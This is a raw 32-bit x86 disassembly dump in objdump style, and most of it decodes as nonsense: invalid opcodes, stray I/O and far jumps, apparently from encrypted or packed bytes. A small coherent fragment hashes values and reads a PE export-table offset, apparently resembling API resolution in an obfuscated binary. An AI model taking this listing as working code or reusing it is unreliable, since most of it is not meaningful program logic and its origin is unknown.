  409052:	mov    al,ds:0x6bf4126e
  409057:	xchg   esi,eax
  409058:	in     eax,0x7e
  40905a:	retf   
  40905b:	push   ecx
  40905c:	and    al,0xfb
  40905e:	mov    ds:0x47c3c7d9,eax
  409063:	icebp  
  409064:	fnstenv [ebp+0x5b]
  409067:	addr16 pop edx
  409069:	clc    
  40906a:	inc    eax
  40906b:	ss mov eax,0xcb07f288
  409071:	leave  
  409072:	sbb    ch,BYTE PTR [edx+0x4a]
  409075:	outs   dx,BYTE PTR ds:[esi]
  409076:	lock mov al,gs:0xf098e215
  40907d:	mov    ds:0x88486a0,eax
  409082:	pop    es
  409083:	xchg   DWORD PTR [ebp-0x21],edi
  409086:	(bad)  
  409087:	xchg   edi,eax
  409088:	inc    esi
  409089:	gs popa 
  40908b:	shl    DWORD PTR [edi-0x69b16fc6],cl
  409091:	dec    esp
  409092:	ins    BYTE PTR es:[edi],dx
  409093:	mov    ebx,0xf85dce4b
  409098:	js     0x409073
  40909a:	(bad)
  40909d:	mov    ebx,0x6d1bf3a2
  4090a2:	jo     0x409114
  4090a4:	cmp    ah,BYTE PTR [ecx-0x3a]
  4090a7:	lods   eax,DWORD PTR ds:[esi]
  4090a8:	sbb    al,0x8d
  4090aa:	ins    DWORD PTR es:[edi],dx
  4090ab:	dec    ebp
  4090ac:	aad    0xf
  4090ae:	fcom   DWORD PTR [esi+ecx*1-0x62]
  4090b2:	std    
  4090b3:	sti    
  4090b4:	sar    BYTE PTR [ecx+ebp*1-0xb5afdf7],cl
  4090bb:	push   ss
  4090bc:	push   ss
  4090bd:	hlt    
  4090be:	fiadd  WORD PTR [ebx+0x27]
  4090c1:	mov    esp,0xcecfa084
  4090c6:	fucomi st,st(0)
  4090c8:	repnz xchg ebp,eax
  4090ca:	outs   dx,DWORD PTR ds:[esi]
  4090cb:	cmp    al,0x49
  4090cd:	pop    ss
  4090ce:	xor    ebx,DWORD PTR [edx-0x380fc4f2]
  4090d4:	add    eax,0x42a801
  4090d9:	jne    0x409156
  4090db:	add    BYTE PTR [eax],al
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x9a4c6c4
  4090f5:	inc    esp
  4090f6:	add    eax,0x78ef8e6c
  4090fb:	js     0x4090a4
  4090fd:	jle    0x409177
  4090ff:	js     0x4090f8
  409101:	mov    BYTE PTR [ecx-0x44699faa],dl
  409107:	dec    esp
  409108:	jle    0x4090ff
  40910a:	jl     0x4090c0
  40910c:	mov    cl,0x4a
  40910e:	adc    BYTE PTR [ebx+0x40],bl
  409111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409112:	jge    0x4090f6
  409114:	push   0x2c
  409116:	and    ebx,ecx
  409118:	adc    DWORD PTR [esi+0x5dce7268],esi
  40911e:	inc    ecx
  40911f:	xchg   esi,eax
  409120:	or     bl,BYTE PTR [esi+0x41]
  409123:	dec    esp
  409124:	push   ecx
  409125:	xor    bh,BYTE PTR [esi+0x44]
  409128:	pop    esp
  409129:	in     al,0x53
  40912b:	jg     0x409157
  40912d:	sub    BYTE PTR [ebx],ch
  40912f:	retf   0xc3b2
  409132:	mov    dl,0x2f
  409134:	mov    BYTE PTR [esi-0x2d221037],al
  40913a:	sub    al,0x8
  40913c:	cs loopne 0x4090d9
  40913f:	test   al,0xb8
  409141:	pop    esp
  409142:	lea    ecx,[esi+0x6dbfb3b]
  409148:	xchg   esp,eax
  409149:	inc    edi
  40914a:	cmp    bh,dl
  40914c:	sbb    eax,0x43e78fc5
  409151:	or     DWORD PTR [edx-0x58],esi
  409154:	mov    ah,0x1e
  409156:	inc    ecx
  409157:	scas   al,BYTE PTR es:[edi]
  409158:	enter  0x1d9f,0x4
  40915c:	pop    ecx
  40915d:	adc    DWORD PTR [ecx+0x44de044d],eax
  409163:	call   0xbc2a83b7
  409168:	pop    edi
  409169:	std    
  40916a:	mov    ah,0x22
  40916c:	dec    eax
  40916d:	outs   dx,DWORD PTR ds:[esi]
  40916e:	rol    DWORD PTR ds:0xf643e738,1
  409174:	sub    BYTE PTR [ebx],ch
  409176:	and    BYTE PTR [edx],0xf8
  409179:	(bad)  
  40917a:	test   DWORD PTR ds:0x911eff07,eax
  409180:	adc    bh,BYTE PTR [ecx-0x67b9c1ca]
  409186:	mov    ah,0x54
  409188:	fstp   QWORD PTR [edx-0x20]
  40918b:	out    dx,al
  40918c:	mov    dh,0x98
  40918e:	push   ebx
  40918f:	stc    
  409190:	test   al,0x13
  409192:	pop    ecx
  409193:	stc    
  409194:	push   esi
  409195:	les    ebp,FWORD PTR [ebp+0x51c2f2fb]
  40919b:	mov    esi,0xe863974c
  4091a0:	sahf   
  4091a1:	and    DWORD PTR [edx+0x2394e141],ebp
  4091a7:	inc    esp
  4091a8:	xor    BYTE PTR ds:0xd2d3e800,bl
  4091ae:	add    al,0x3
  4091b0:	jne    0x4091e5
  4091b2:	dec    eax
  4091b3:	into   
  4091b4:	dec    BYTE PTR [ebp+0x1f]
  4091b7:	mov    edi,0xd0a29b16
  4091bc:	out    dx,al
  4091bd:	loope  0x409167
  4091bf:	fcom   QWORD PTR [edx]
  4091c1:	scas   al,BYTE PTR es:[edi]
  4091c2:	xchg   BYTE PTR [ebp-0x28d1d9ee],ch
  4091c8:	sub    ebp,esp
  4091ca:	add    eax,DWORD PTR [edi-0x60]
  4091cd:	push   ds
  4091ce:	push   cs
  4091cf:	fsubr  DWORD PTR [eax+ecx*4]
  4091d2:	dec    esp
  4091d3:	cdq    
  4091d4:	pop    ebp
  4091d5:	scas   al,BYTE PTR es:[edi]
  4091d6:	aaa    
  4091d7:	dec    esi
  4091d8:	enter  0x72b3,0x66
  4091dc:	push   ss
  4091dd:	mov    edx,0xf93b395e
  4091e2:	sub    cl,BYTE PTR ds:0x16589ba
  4091e8:	fisttp DWORD PTR [ebx+0x4b]
  4091eb:	xor    DWORD PTR [edx+0x579f2664],edi
  4091f1:	shl    BYTE PTR [edi],0x2c
  4091f4:	mov    ebp,0xabdc5303
  4091f9:	fcmovu st,st(6)
  4091fb:	repnz pop eax
  4091fd:	or     bh,BYTE PTR [edx+esi*4]
  409200:	xchg   ecx,eax
  409201:	pop    edx
  409202:	outs   dx,DWORD PTR ds:[esi]
  409203:	sti    
  409204:	imul   BYTE PTR [ecx+0x11cb7b4d]
  40920a:	push   ebx
  40920b:	in     al,0x2b
  40920d:	mul    DWORD PTR [ebx-0x2e]
  409210:	adc    eax,0x51cb0c23
  409215:	mov    cs,WORD PTR [ebx+0x73]
  409218:	in     eax,dx
  409219:	jle    0x409269
  40921b:	jb     0x409261
  40921d:	mov    al,0x80
  40921f:	sbb    BYTE PTR [eax+0x2f],0x51
  409223:	fwait
  409224:	add    ch,bl
  409226:	sar    ebp,0xc
  409229:	rcr    BYTE PTR [ecx+0x6ccc3d19],1
  40922f:	sub    ebx,DWORD PTR [ecx+edx*4]
  409232:	adc    BYTE PTR [edi+0x12],0x12
  409236:	cmp    ecx,DWORD PTR [edi+0x64d84aa1]
  40923c:	loop   0x4091f6
  40923e:	inc    esi
  40923f:	sbb    BYTE PTR [ebx+esi*4+0x69],dh
  409243:	xchg   ecx,eax
  409244:	adc    eax,0x1fb84603
  409249:	or     al,0x13
  40924b:	cmc    
  40924c:	fist   DWORD PTR [esi-0xd]
  40924f:	sub    eax,0xd87acffa
  409254:	pop    eax
  409255:	pop    ebx
  409256:	and    ebx,0xc69e410e
  40925c:	push   ebx
  40925d:	mov    eax,DWORD PTR ds:0x6544612f
  409263:	mov    ch,0xce
  409265:	ret    0x934d
  409268:	mov    cl,0x18
  40926a:	inc    ebp
  40926b:	ficomp WORD PTR [esi+ecx*1]
  40926e:	xor    al,0xcb
  409270:	sbb    al,0x63
  409272:	pop    esi
  409273:	push   ss
  409274:	clc    
  409275:	fs pusha 
  409277:	adc    DWORD PTR [ecx],0x4af2f6c9
  40927d:	cmc    
  40927e:	dec    ebx
  40927f:	jle    0x40929d
  409281:	(bad)  
  409282:	repnz mul DWORD PTR [ebx+0x4952f2c6]
  409289:	cs adc eax,0xdfd05613
  40928f:	icebp  
  409290:	xchg   BYTE PTR [eax-0x44204300],bh
  409296:	mov    edi,0xa1ce4acf
  40929b:	xchg   esp,eax
  40929c:	mov    bl,0x52
  40929e:	ins    BYTE PTR es:[edi],dx
  40929f:	and    al,0xa1
  4092a1:	or     BYTE PTR [ebx],cl
  4092a3:	leave  
  4092a4:	lods   al,BYTE PTR ds:[esi]
  4092a5:	out    0xe4,al
  4092a7:	loopne 0x409245
  4092a9:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4092ab:	test   DWORD PTR [ebp-0x10180ac8],esp
  4092b1:	lods   al,BYTE PTR ds:[esi]
  4092b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092b3:	call   0x4f0a5cd0
  4092b8:	sub    BYTE PTR [ecx-0x77865c9f],ah
  4092be:	lds    ebx,FWORD PTR [ecx+0x4]
  4092c1:	pop    es
  4092c2:	icebp  
  4092c3:	pusha  
  4092c4:	or     DWORD PTR [esi-0x1fb45cbd],edx
  4092ca:	inc    edx
  4092cb:	mov    edx,0xcb16f9a3
  4092d0:	into   
  4092d1:	xchg   BYTE PTR [eax+0x0],bl
  4092d4:	push   ds
  4092d5:	pusha  
  4092d6:	xchg   ebp,eax
  4092d7:	int3   
  4092d8:	loopne 0x4092de
  4092da:	in     al,dx
  4092db:	pop    esi
  4092dc:	shl    BYTE PTR [edi],1
  4092de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092df:	and    eax,0x985821d2
  4092e4:	fcomp  QWORD PTR [ecx]
  4092e6:	scas   al,BYTE PTR es:[edi]
  4092e7:	sbb    bh,BYTE PTR [edx-0x7f]
  4092ea:	lods   eax,DWORD PTR ds:[esi]
  4092eb:	push   eax
  4092ec:	xchg   esi,eax
  4092ed:	xor    DWORD PTR [ecx],esi
  4092ef:	arpl   WORD PTR [ecx-0x80],si
  4092f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092f3:	sub    ebp,ecx
  4092f5:	or     al,0x83
  4092f7:	or     BYTE PTR [edi-0x170700e],dh
  4092fd:	pushf  
  4092fe:	xor    BYTE PTR [ecx+ebx*1+0xa],cl
  409302:	pop    esi
  409303:	call   0x3bf59420
  409308:	inc    ebp
  409309:	and    al,0x3d
  40930b:	sahf   
  40930c:	pop    edx
  40930d:	bound  esi,QWORD PTR [eax]
  40930f:	add    al,0x19
  409311:	cmp    dh,BYTE PTR [ecx]
  409313:	push   0x3a
  409315:	adc    eax,0xc1d7c57a
  40931a:	dec    ebp
  40931b:	ins    BYTE PTR es:[edi],dx
  40931c:	cmp    ecx,ecx
  40931e:	jle    0x409369
  409320:	adc    ecx,ebp
  409322:	xor    eax,ebx
  409324:	add    ebx,DWORD PTR [edx+0x53]
  409327:	imul   edi,DWORD PTR [esi-0x28],0xb67caa22
  40932e:	aam    0x56
  409330:	call   0xae79:0x1dc39f8c
  409337:	fdiv   QWORD PTR [esi-0x3d18350b]
  40933d:	mov    ch,0xee
  40933f:	repnz cdq 
  409341:	adc    eax,0x9b3925e
  409346:	mov    ebx,DWORD PTR ds:0x5a4d23c0
  40934c:	jecxz  0x4092f0
  40934e:	aas    
  40934f:	sti    
  409350:	pop    es
  409351:	retf   
  409352:	pop    esp
  409353:	mov    dh,0x8c
  409355:	dec    eax
  409356:	mov    esi,0xd7d45d03
  40935b:	mov    BYTE PTR [edx+0x38],ah
  40935e:	fxam   
  409360:	mov    eax,0xfe9d1018
  409365:	or     eax,0x66fe7a30
  40936a:	mov    edi,0x988fdc18
  40936f:	or     BYTE PTR ds:0x15c47076,0x10
  409376:	out    dx,ax
  409378:	or     al,0x0
  40937a:	adc    BYTE PTR ds:0x44023ea8,ah
  409380:	repnz dec ebx
  409382:	sahf   
  409383:	dec    eax
  409384:	mov    esp,0xbdd62431
  409389:	sbb    BYTE PTR [edx+0x50955839],bh
  40938f:	mov    ds:0xdf2d12bc,al
  409394:	repnz fsubp st(1),st
  409397:	cmp    BYTE PTR [esi+0x5f77d3c0],0xf3
  40939e:	cdq    
  40939f:	cmp    edi,edx
  4093a1:	pushf  
  4093a2:	mov    cl,0xc7
  4093a4:	cli    
  4093a5:	mov    edi,0x8b65573e
  4093aa:	inc    ebp
  4093ab:	cld    
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0x410dff3d
  4093fb:	push   eax
  4093fc:	iret   
  4093fd:	xor    eax,0xa77878ec
  409402:	jle    0x40947c
  409404:	js     0x40940e
  409406:	xchg   esi,eax
  409407:	jge    0x4093b8
  409409:	mov    esi,0xe39bcf72
  40940e:	dec    ebx
  40940f:	fld    st(4)
  409411:	ficom  WORD PTR [ebp+0x48d68195]
  409417:	jle    0x40940d
  409419:	es into 
  40941b:	inc    edx
  40941c:	inc    edx
  40941d:	push   ebp
  40941e:	in     al,dx
  40941f:	pop    edx
  409420:	dec    esi
  409421:	je     0x4093ca
  409423:	call   0x6da:0x45deafbb
  40942a:	out    dx,al
  40942b:	shr    BYTE PTR [ecx+0x9550245],cl
  409431:	dec    esp
  409432:	(bad)  
  409435:	ja     0x4093dc
  409437:	out    0xab,al
  409439:	ror    ch,1
  40943b:	shl    DWORD PTR [edx+0x8e84408],1
  409441:	outs   dx,BYTE PTR ds:[esi]
  409442:	mov    eax,DWORD PTR [ebp+0x69296689]
  409448:	shl    BYTE PTR [ebx-0x47],0x1b
  40944c:	imul   ecx,DWORD PTR [edx+0x7c],0xffffff8a
  409450:	das    
  409451:	mov    al,BYTE PTR [eax-0x6a]
  409454:	ficomp DWORD PTR [eax]
  409456:	ja     0x409462
  409458:	push   es
  409459:	aam    0x6b
  40945b:	sbb    eax,0x4f01a65f
  409460:	scas   eax,DWORD PTR es:[edi]
  409461:	rol    esi,cl
  409463:	sbb    al,0xd6
  409465:	ret    
  409466:	addps  xmm0,XMMWORD PTR [eax+0x3d]
  40946a:	shl    DWORD PTR [ecx-0x5],1
  40946d:	xor    DWORD PTR [edi-0x14f76dcc],ebx
  409473:	addr16 mov bh,ah
  409476:	mov    bh,0x7a
  409478:	js     0x409402
  40947a:	add    eax,0xf436a714
  40947f:	sbb    eax,0x261d6658
  409484:	push   0x3a
  409486:	dec    esp
  409487:	jmp    0xb73b3021
  40948c:	(bad)  
  40948d:	jmp    0x5a14:0x8a86ae2b
  409494:	adc    ebx,DWORD PTR [ebp-0x73b0e73b]
  40949a:	sbb    al,0x4c
  40949c:	jge    0x40951a
  40949e:	sti    
  40949f:	(bad)  
  4094a0:	scas   eax,DWORD PTR es:[edi]
  4094a1:	pop    eax
  4094a2:	jle    0x4094ea
  4094a4:	dec    BYTE PTR [eax-0x3a]
  4094a7:	push   0x6c424f93
  4094ac:	and    edx,eax
  4094ae:	fs push ebx
  4094b0:	inc    ebp
  4094b1:	push   esp
  4094b2:	mov    BYTE PTR [eax+0x4c],cl
  4094b5:	pusha  
  4094b6:	push   ebx
  4094b7:	fist   WORD PTR [edx+0x77]
  4094ba:	pop    ss
  4094bb:	xor    BYTE PTR [edi-0xa],ch
  4094be:	cli    
  4094bf:	addr16 pop ds
  4094c1:	(bad)  
  4094c2:	xor    eax,DWORD PTR [ebp-0x146fb164]
  4094c8:	test   dh,0x85
  4094cb:	or     eax,0xb1dce723
  4094d0:	mov    eax,fs:0x87c473e1
  4094d6:	cmp    DWORD PTR [eax],0xffffffaf
  4094d9:	rcr    DWORD PTR [ebx],cl
  4094db:	push   esp
  4094dc:	and    BYTE PTR [eax-0x632df35e],cl
  4094e2:	sbb    DWORD PTR [edx],ebx
  4094e4:	retf   0x9ac
  4094e7:	out    dx,eax
  4094e8:	sub    ah,BYTE PTR [ebx]
  4094ea:	mov    ebp,0xa11a8c5e
  4094ef:	cmp    DWORD PTR [edi+0x3b8e87ac],esi
  4094f5:	int3   
  4094f6:	push   es
  4094f7:	xchg   esp,eax
  4094f8:	inc    ebp
  4094f9:	xchg   DWORD PTR [ebx],edx
  4094fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094fc:	rol    bh,1
  4094fe:	retf   0x7303
  409501:	add    eax,0x2073fa4a
  409506:	adc    BYTE PTR [eax-0x583c6a32],dl
  40950c:	cmp    DWORD PTR [ecx+0x730f41e1],ebp
  409512:	test   BYTE PTR [eax+0x5a],ah
  409515:	in     eax,dx
  409516:	lahf   
  409517:	or     al,BYTE PTR [ebp+0x32d166ee]
  40951d:	call   0xbc014e23
  409522:	pop    ss
  409523:	xchg   DWORD PTR [ecx+0xb],ecx
  409526:	test   eax,0xdd09c209
  40952b:	dec    edi
  40952c:	pop    esp
  40952d:	mov    ecx,0x6c4eb96f
  409532:	pop    esi
  409533:	inc    esp
  409534:	ficom  WORD PTR [edi]
  409536:	fisub  DWORD PTR [ebx-0x38]
  409539:	mov    eax,ds:0x88175faa
  40953e:	add    BYTE PTR [edi+0x31],0x7b
  409542:	inc    edi
  409543:	mov    cl,0xc5
  409545:	cmc    
  409546:	scas   eax,DWORD PTR es:[edi]
  409547:	and    eax,0x3bb8fbed
  40954c:	jbe    0x409552
  40954e:	add    dh,BYTE PTR [esi+0x9]
  409551:	(bad)  
  409552:	mov    BYTE PTR [ecx],dh
  409554:	sub    edx,0xe06734d6
  40955a:	mov    ch,0x7d
  40955c:	push   eax
  40955d:	outs   dx,DWORD PTR ds:[esi]
  40955e:	cmp    BYTE PTR [esi],ah
  409560:	xchg   edi,eax
  409561:	xor    DWORD PTR [ebx+eiz*1-0x245b947b],edx
  409568:	aad    0xee
  40956a:	std    
  40956b:	sbb    bh,BYTE PTR [esi+ecx*8]
  40956e:	dec    ebp
  40956f:	loop   0x40958e
  409571:	xor    DWORD PTR [ebp-0x6e],esi
  409574:	cmp    ah,0x4c
  409577:	shr    DWORD PTR [eax-0x4bf7dc4],1
  40957d:	adc    BYTE PTR [edi+0x74],dh
  409580:	pop    edx
  409581:	sbb    al,0xbd
  409583:	mov    esp,0x36d073fd
  409588:	retf   0x6e31
  40958b:	adc    ch,BYTE PTR [esi-0x63]
  40958e:	stos   BYTE PTR es:[edi],al
  40958f:	pop    edx
  409590:	mov    al,ds:0xf84d1d34
  409595:	pop    ecx
  409596:	(bad)  ds:0x8e740bc1
  40959c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40959d:	js     0x4095d6
  40959f:	popa   
  4095a0:	pop    ds
  4095a1:	mov    edi,0xef56bf06
  4095a6:	push   ds
  4095a7:	(bad)
  4095aa:	sti    
  4095ab:	pushf  
  4095ac:	into   
  4095ad:	cwde   
  4095ae:	sub    ebp,DWORD PTR [edi-0x10364d]
  4095b4:	cmp    BYTE PTR [edi-0x6ba3e82c],dh
  4095ba:	cmp    ebx,ebx
  4095bc:	inc    eax
  4095bd:	fnsave [edi+0x265c8c85]
  4095c3:	fimul  WORD PTR [ebx-0x6cb00d63]
  4095c9:	(bad)  
  4095ca:	jg     0x4095be
  4095cc:	inc    esp
  4095cd:	and    DWORD PTR [ebx],edx
  4095cf:	rol    BYTE PTR [ecx],cl
  4095d1:	mov    bh,0xee
  4095d3:	xchg   ebx,eax
  4095d4:	jp     0x4095a3
  4095d6:	scas   eax,DWORD PTR es:[edi]
  4095d7:	shl    DWORD PTR [edi-0xa],cl
  4095da:	xor    al,0x99
  4095dc:	mov    ?,WORD PTR [edx+0x66]
  4095df:	imul   ebx,esi,0xffffff8f
  4095e2:	test   eax,0xf56d9b18
  4095e7:	lea    esp,[ecx]
  4095e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095ea:	aam    0x8a
  4095ec:	push   esp
  4095ed:	push   ebp
  4095ee:	dec    ebx
  4095ef:	xor    ecx,edx
  4095f1:	(bad)  
  4095f3:	maskmovq mm7,(bad)
  4095f4:	idiv   DWORD PTR [ebx]
  4095f6:	aad    0x55
  4095f8:	ret    
  4095f9:	add    eax,0xe814250a
  4095fe:	shr    BYTE PTR [ebp-0x45a4756],0x51
  409605:	xlat   BYTE PTR cs:[ebx]
  409607:	bound  ebp,QWORD PTR [ebx-0x238f2d10]
  40960d:	add    DWORD PTR [ebp-0x21],ecx
  409610:	test   eax,0x9d7784bd
  409615:	fisttp WORD PTR [ecx+esi*2-0x1f5ff98d]
  40961c:	sub    al,0x17
  40961e:	int3   
  40961f:	pop    es
  409620:	clc    
  409621:	add    DWORD PTR ds:0x10f6b482,esp
  409627:	inc    ebx
  409628:	les    ebp,FWORD PTR [edx-0x2f]
  40962b:	iret   
  40962c:	fisttp QWORD PTR [ecx+ecx*2-0x42dbd1d9]
  409633:	cmp    al,0xa7
  409635:	xchg   ebp,eax
  409636:	xchg   ebp,eax
  409637:	cmp    al,0x8
  409639:	(bad)  
  40963a:	ss enter 0x7fc4,0x9f
  40963f:	enter  0x52bd,0x24
  409643:	iret   
  409644:	sbb    dh,dl
  409646:	test   al,0xf8
  409648:	cmp    ah,BYTE PTR [ebx]
  40964a:	sub    cl,BYTE PTR gs:[ecx-0x5f]
  40964e:	mov    esi,0x3b864eea
  409653:	mov    esp,0x4312e6cc
  409658:	dec    edi
  409659:	in     al,dx
  40965a:	dec    esi
  40965b:	xor    BYTE PTR [edx-0x14],dh
  40965e:	stc    
  40965f:	or     al,0x65
  409661:	mov    esp,0x583d9462
  409666:	cld    
  409667:	fcmovnb st,st(7)
  409669:	xchg   DWORD PTR [ebx+0x76e7f297],eax
  40966f:	sbb    DWORD PTR [edx-0x13],edx
  409672:	cdq    
  409673:	ja     0x409682
  409675:	push   es
  409676:	test   edx,eax
  409678:	pop    ebx
  409679:	je     0x4096ce
  40967b:	call   0xf792:0x81d30287
  409682:	sbb    eax,0x58ac0f
  409687:	popa   
  409688:	push   ss
  409689:	pop    edx
  40968a:	mov    ecx,DWORD PTR [eax+eax*4+0x7a]
  40968e:	jge    0x4096ec
  409690:	sub    eax,0x37254de6
  409695:	dec    edi
  409696:	dec    edi
  409697:	in     eax,dx
  409698:	adc    eax,0xae66d6b3
  40969d:	jecxz  0x409706
  40969f:	push   0xffffffa0
  4096a1:	jae    0x409669
  4096a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096a4:	mov    ebp,0x73511481
  4096a9:	lods   eax,DWORD PTR ds:[esi]
  4096aa:	xchg   esi,eax
  4096ab:	pop    edx
  4096ac:	mov    al,BYTE PTR [edi-0x75]
  4096af:	inc    ebp
  4096b0:	cld    
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x8b
  4096e4:	rcl    DWORD PTR [ebx-0x42],0x5c
  4096e8:	bnd js 0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x4096da
  4096f0:	rcr    BYTE PTR [ecx-0x5b],cl
  4096f3:	xor    eax,0x810c1ba
  4096f8:	xor    ecx,DWORD PTR es:[ecx-0xa]
  4096fc:	not    BYTE PTR [eax+0xf]
  4096ff:	xor    edi,ebx
  409701:	adc    al,al
  409703:	push   edi
  409704:	sbb    ebx,DWORD PTR [ebx-0x13]
  409707:	dec    edi
  409708:	stos   BYTE PTR es:[edi],al
  409709:	mov    esi,0xaebcd914
  40970e:	in     eax,0xe9
  409710:	mov    al,0xf9
  409712:	in     eax,0xd0
  409714:	into   
  409715:	mov    eax,ds:0xdb748435
  40971a:	mov    ebp,0x75d1b2a8
  40971f:	and    eax,DWORD PTR [edx+0x7ab92253]
  409725:	dec    esp
  409726:	add    BYTE PTR [edx-0x4b],al
  409729:	dec    esp
  40972a:	xor    eax,0x64dc00a2
  40972f:	icebp  
  409730:	inc    ecx
  409731:	xchg   DWORD PTR gs:[ebx+0x3e2724ba],ecx
  409738:	sbb    al,0x65
  40973a:	in     al,0xff
  40973c:	jbe    0x409738
  40973e:	and    al,0xc5
  409740:	cmc    
  409741:	sub    DWORD PTR [edx+ebx*8],ebx
  409744:	int    0xb
  409746:	js     0x4096d8
  409748:	gs sbb dh,bl
  40974b:	icebp  
  40974c:	jle    0x40975b
  40974e:	xchg   DWORD PTR [edx-0x7bbe7e8f],ebp
  409754:	shl    BYTE PTR [ebx+0x13],cl
  409757:	das    
  409758:	adc    BYTE PTR [ecx],0x54
  40975b:	les    ebx,FWORD PTR [ecx+0x3c5d3168]
  409761:	mov    bl,0xa7
  409763:	mov    ss,ecx
  409765:	jno    0x4097d6
  409767:	(bad)  
  409768:	into   
  409769:	adc    esp,eax
  40976b:	test   DWORD PTR [eax],esi
  40976d:	jle    0x409704
  40976f:	push   ebp
  409770:	(bad)  
  409771:	pop    eax
  409772:	sub    eax,0x56043221
  409777:	dec    edx
  409778:	stos   DWORD PTR es:[edi],eax
  409779:	sti    
  40977a:	fiadd  DWORD PTR [esi+ebx*8+0x2a31d832]
  409781:	mov    ds:0xccc968b3,eax
  409786:	test   al,0x17
  409788:	xor    eax,esi
  40978a:	icebp  
  40978b:	shl    edi,1
  40978d:	adc    eax,0x55def7ed
  409792:	cli    
  409793:	sub    esi,DWORD PTR [edx-0x22]
  409796:	pop    es
  409797:	pop    edi
  409798:	xor    al,0xdc
  40979a:	es push edi
  40979c:	outs   dx,DWORD PTR ds:[esi]
  40979d:	rol    BYTE PTR [eax-0x2c],0xec
  4097a1:	add    ah,bl
  4097a3:	stc    
  4097a4:	bound  eax,QWORD PTR [ecx-0x1d77a374]
  4097aa:	add    ch,BYTE PTR [ecx+0xd]
  4097ad:	aaa    
  4097ae:	inc    eax
  4097af:	push   ds
  4097b0:	jne    0x409813
  4097b2:	mov    ?,WORD PTR [edi]
  4097b4:	idiv   DWORD PTR [ebx+0x12dc6690]
  4097ba:	push   ebx
  4097bb:	inc    ebp
  4097bc:	pop    ebp
  4097bd:	hlt    
  4097be:	xchg   ecx,eax
  4097bf:	jo     0x4097ca
  4097c1:	mov    eax,ebx
  4097c3:	pushf  
  4097c4:	mov    eax,0xb7f04b17
  4097c9:	push   ebx
  4097ca:	push   0xa674b1fe
  4097cf:	pop    edi
  4097d0:	gs popa 
  4097d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097d3:	jae    0x4097b7
  4097d5:	xchg   esp,eax
  4097d6:	jmp    0x2846bc57
  4097db:	cwde   
  4097dc:	pop    esp
  4097dd:	mov    dl,BYTE PTR [ebx+0x8]
  4097e0:	mov    al,ds:0x2229cdc5
  4097e5:	es dec ebp
  4097e7:	mov    edi,0x8ab75b78
  4097ec:	inc    esi
  4097ed:	jnp    0x409813
  4097ef:	jne    0x4097b1
  4097f1:	jmp    0x4052c047
  4097f6:	push   ds
  4097f7:	rcl    DWORD PTR [esi],1
  4097f9:	rcr    DWORD PTR [edi+0x9],1
  4097fc:	retf   
  4097fd:	jl     0x4097c2
  4097ff:	nop
  409800:	jbe    0x409824
  409802:	inc    ecx
  409803:	xor    edi,ebx
  409805:	lahf   
  409806:	pop    ss
  409807:	mov    al,ds:0x2f06844
  40980c:	mov    fs,esi
  40980e:	jo     0x40986b
  409810:	inc    esp
  409811:	add    eax,0x9412744
  409816:	lods   eax,DWORD PTR ds:[esi]
  409817:	jmp    0xe8d0110d
  40981c:	imul   ebx,DWORD PTR ds:0x9e214263,0xfffffff0
  409823:	loope  0x4097fc
  409825:	imul   ecx,ecx,0xc422ce9e
  40982b:	sti    
  40982c:	dec    edi
  40982d:	(bad)  
  40982f:	icebp  
  409830:	push   ss
  409831:	fldenv ds:[ecx-0xce0da7e]
  409838:	mov    esp,eax
  40983a:	push   cs
  40983b:	repnz sub al,0x40
  40983e:	add    esp,DWORD PTR [ebx+0x9f7dc7f]
  409844:	jmp    0x4098a4
  409846:	rcl    DWORD PTR [esi-0x45],cl
  409849:	sbb    edi,ebp
  40984b:	lods   eax,DWORD PTR ds:[esi]
  40984c:	jmp    0x15d4:0x4aa87339
  409853:	out    dx,eax
  409854:	mov    bh,0x1a
  409856:	inc    ebp
  409857:	loope  0x409800
  409859:	ficom  WORD PTR [eax+0xaf08bc0]
  40985f:	nop
  409860:	push   eax
